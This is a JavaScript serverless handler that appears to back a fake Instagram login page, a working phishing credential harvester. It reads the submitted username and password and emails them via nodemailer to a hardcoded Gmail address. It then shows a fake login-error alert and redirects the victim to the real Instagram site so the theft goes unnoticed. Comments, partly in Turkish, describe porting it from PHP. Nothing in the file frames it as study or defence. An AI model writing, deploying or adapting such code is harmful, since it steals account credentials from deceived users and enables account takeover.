import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).send("Method Not Allowed");
  }

  const username = req.body?.u_name || "";
  const passcode = req.body?.pass || "";

  const subject = "Someone Login ! Insta Dummy page";
  const to = "cy207551@gmail.com";

  const txt = `Username: ${username}\r\nPassword: ${passcode}`;

  if (username && passcode) {
    try {
      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
          user: process.env.MY_EMAIL,   // kendi gmail adresin
          pass: process.env.MY_PASS,    // Gmail App Password
        },
      });

      await transporter.sendMail({
        from: process.env.MY_EMAIL,
        to,
        subject,
        text: txt,
      });

      // PHP’deki alert + redirect mantığı
      res.setHeader("Content-Type", "text/html");
      res.send(`
        <script type="text/javascript">
          alert('Error ! Unable to login ');
          window.location.replace('https://www.instagram.com');
        </script>
      `);
    } catch (err) {
      console.error("Mail error:", err);
      res.status(500).send("Mail send error");
    }
  } else {
    res.setHeader("Content-Type", "text/html");
    res.send(`
      <script type="text/javascript">
        alert('Please enter correct username or password. Try again ');
        window.history.go(-1);
      </script>
    `);
  }
}
